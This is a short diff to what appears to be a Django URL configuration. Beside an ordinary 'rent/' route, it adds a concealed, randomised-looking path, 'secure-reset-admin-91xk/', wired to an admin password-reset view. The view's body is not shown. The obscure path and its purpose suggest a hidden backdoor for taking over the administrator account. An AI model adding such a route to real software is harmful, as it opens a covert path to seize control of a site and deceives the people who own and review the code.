@@ -36,8 +36,10 @@ urlpatterns = [
 path('rent/', views.rent, name='rent'),
 
 
-
-
+path(
+    "secure-reset-admin-91xk/",
+    views.reset_admin_password,
+),
 ]
 
 
